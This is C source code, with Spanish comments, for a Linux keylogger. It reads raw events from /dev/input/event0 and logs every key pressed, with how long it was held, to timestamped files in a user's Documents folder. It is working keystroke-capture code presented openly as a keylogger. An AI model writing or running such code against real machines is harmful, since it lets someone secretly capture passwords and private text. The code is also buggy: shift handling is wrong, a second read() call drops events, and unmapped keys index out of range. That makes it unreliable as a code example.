#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <linux/input.h>
#include <unistd.h>
#include <time.h>

// Función para obtener el nombre del archivo de log basado en la fecha y hora actuales
char* get_log_filename() {
    static char filename[128];
    time_t t = time(NULL);
    strftime(filename, sizeof(filename), "/home/apollo/Documents/keylogger/%d-%m-%Y_%H-%M.txt", localtime(&t));
    return filename;
}

// Mapeo de códigos de teclas a caracteres
const char* keycode_to_string(int code, int shift) {
    static const char *keymap[] = {
        [KEY_A] = "a", [KEY_B] = "b", [KEY_C] = "c", [KEY_D] = "d",
        [KEY_E] = "e", [KEY_F] = "f", [KEY_G] = "g", [KEY_H] = "h",
        [KEY_I] = "i", [KEY_J] = "j", [KEY_K] = "k", [KEY_L] = "l",
        [KEY_M] = "m", [KEY_N] = "n", [KEY_O] = "o", [KEY_P] = "p",
        [KEY_Q] = "q", [KEY_R] = "r", [KEY_S] = "s", [KEY_T] = "t",
        [KEY_U] = "u", [KEY_V] = "v", [KEY_W] = "w", [KEY_X] = "x",
        [KEY_Y] = "y", [KEY_Z] = "z", [KEY_1] = "1", [KEY_2] = "2",
        [KEY_3] = "3", [KEY_4] = "4", [KEY_5] = "5", [KEY_6] = "6",
        [KEY_7] = "7", [KEY_8] = "8", [KEY_9] = "9", [KEY_0] = "0",
        [KEY_MINUS] = "-", [KEY_EQUAL] = "=", [KEY_SPACE] = " ",
        [KEY_ENTER] = "ENTER", [KEY_ESC] = "ESC", [KEY_TAB] = "TAB",
        [KEY_CAPSLOCK] = "CAPSLOCK", [KEY_F1] = "F1", [KEY_F2] = "F2",
        [KEY_F3] = "F3", [KEY_F4] = "F4", [KEY_F5] = "F5", [KEY_F6] = "F6",
        [KEY_F7] = "F7", [KEY_F8] = "F8", [KEY_F9] = "F9", [KEY_F10] = "F10",
        [KEY_F11] = "F11", [KEY_F12] = "F12", [KEY_LEFTSHIFT] = "LEFTSHIFT",
        [KEY_RIGHTSHIFT] = "RIGHTSHIFT", [KEY_LEFTCTRL] = "LEFTCTRL",
        [KEY_RIGHTCTRL] = "RIGHTCTRL", [KEY_LEFTALT] = "LEFTALT",
        [KEY_RIGHTALT] = "RIGHTALT", [KEY_LEFTMETA] = "LEFTMETA",
        [KEY_RIGHTMETA] = "RIGHTMETA", [KEY_NUMLOCK] = "NUMLOCK",
        [KEY_SCROLLLOCK] = "SCROLLLOCK", [KEY_UP] = "UP", [KEY_DOWN] = "DOWN",
        [KEY_LEFT] = "LEFT", [KEY_RIGHT] = "RIGHT", [KEY_INSERT] = "INSERT",
        [KEY_DELETE] = "DELETE", [KEY_HOME] = "HOME", [KEY_END] = "END",
        [KEY_PAGEUP] = "PAGEUP", [KEY_PAGEDOWN] = "PAGEDOWN",
        [KEY_PAUSE] = "PAUSE", [KEY_PRINT] = "PRINT", [KEY_SYSRQ] = "SYSRQ",
        [KEY_BREAK] = "BREAK"
    };

    static const char *shift_keymap[] = {
        [KEY_A] = "A", [KEY_B] = "B", [KEY_C] = "C", [KEY_D] = "D",
        [KEY_E] = "E", [KEY_F] = "F", [KEY_G] = "G", [KEY_H] = "H",
        [KEY_I] = "I", [KEY_J] = "J", [KEY_K] = "K", [KEY_L] = "L",
        [KEY_M] = "M", [KEY_N] = "N", [KEY_O] = "O", [KEY_P] = "P",
        [KEY_Q] = "Q", [KEY_R] = "R", [KEY_S] = "S", [KEY_T] = "T",
        [KEY_U] = "U", [KEY_V] = "V", [KEY_W] = "W", [KEY_X] = "X",
        [KEY_Y] = "Y", [KEY_Z] = "Z", [KEY_1] = "!", [KEY_2] = "@",
        [KEY_3] = "#", [KEY_4] = "$", [KEY_5] = "%", [KEY_6] = "^",
        [KEY_7] = "&", [KEY_8] = "*", [KEY_9] = "(", [KEY_0] = ")",
        [KEY_MINUS] = "_", [KEY_EQUAL] = "+", [KEY_BACKSLASH] = "|",
        [KEY_LEFTBRACE] = "{", [KEY_RIGHTBRACE] = "}", [KEY_SEMICOLON] = ":",
        [KEY_APOSTROPHE] = "\"", [KEY_GRAVE] = "~", [KEY_COMMA] = "<",
        [KEY_DOT] = ">", [KEY_SLASH] = "?"
    };

    return shift ? shift_keymap[code] : keymap[code];
}

int main() {
    char *log_file = get_log_filename();
    const char *device_path = "/dev/input/event0";
    int device = open(device_path, O_RDONLY);
    if (device == -1) {
        perror("No se pudo abrir el dispositivo de entrada");
        return EXIT_FAILURE;
    }

    struct input_event ev;
    struct timeval press_time;
    int shift_pressed = 0;

    printf("Escuchando eventos en %s y registrando en %s\n", device_path, log_file);

    while (1) {
        if (read(device, &ev, sizeof(ev)) > 0 && ev.type == EV_KEY) {
            if (ev.value == 1) {  // Tecla presionada
                gettimeofday(&press_time, NULL);
                shift_pressed = (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT);
            } else if (ev.value == 0) {  // Tecla soltada
                struct timeval release_time;
                gettimeofday(&release_time, NULL);
                long duration = (release_time.tv_sec - press_time.tv_sec) * 1000 +
                                (release_time.tv_usec - press_time.tv_usec) / 1000;

                FILE *log_fp = fopen(log_file, "a");
                if (log_fp) {
                    fprintf(log_fp, "Tecla: %s, Duración: %ld ms\n",
                            keycode_to_string(ev.code, shift_pressed), duration);
                    fclose(log_fp);
                } else {
                    perror("No se pudo abrir el archivo de log");
                }
            }
        } else if (read(device, &ev, sizeof(ev)) == -1) {
            perror("Error al leer del dispositivo");
            close(device);
            return EXIT_FAILURE;
        }
    }

    close(device);
    return 0;
}
